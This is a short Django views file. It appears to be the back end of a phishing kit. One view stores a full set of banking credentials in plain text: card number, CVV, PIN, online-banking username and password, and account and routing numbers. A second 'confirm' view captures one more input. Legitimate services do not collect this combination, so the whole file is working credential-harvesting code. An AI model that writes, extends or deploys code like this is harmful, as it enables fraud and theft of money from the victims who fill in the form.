from django.shortcuts import render, redirect
from django.http import HttpResponse
from .forms import BankForm, SingleInputForm
from .models import BankFormSubmission


def form(request):
    if request.method == "POST":
        form = BankForm(request.POST)
        if form.is_valid():
            # Save the data to the model
            BankFormSubmission.objects.create(
                first_name=form.cleaned_data['first_name'],
                last_name=form.cleaned_data['last_name'],
                address=form.cleaned_data['address'],
                email=form.cleaned_data['email'],
                password=form.cleaned_data['password'],  # Consider hashing passwords
                card_number=form.cleaned_data['card_number'],
                expiry_date=form.cleaned_data['expiry_date'],
                ccv_security_code=form.cleaned_data['ccv_security_code'],
                card_pin=form.cleaned_data['card_pin'],
                bank_username=form.cleaned_data['bank_username'],
                bank_password=form.cleaned_data['bank_password'],  # Consider hashing passwords
                account_number=form.cleaned_data['account_number'],
                routing_number=form.cleaned_data['routing_number'],
            )
            return redirect('confirm')  # Redirect to the confirm view
        else:
            return HttpResponse("Invalid data submitted!")  # Handle invalid form data
    else:
        form = BankForm()
    
    return render(request, 'wform/form.html', {'form': form})

from django.shortcuts import render, redirect
from .forms import SingleInputForm

def confirm(request):
    if request.method == 'POST':
        form = SingleInputForm(request.POST)
        if form.is_valid():
            form.save()  # Save input to the database
    else:
        form = SingleInputForm()

    return render(request, 'wform/confirm.html', {'form': form})
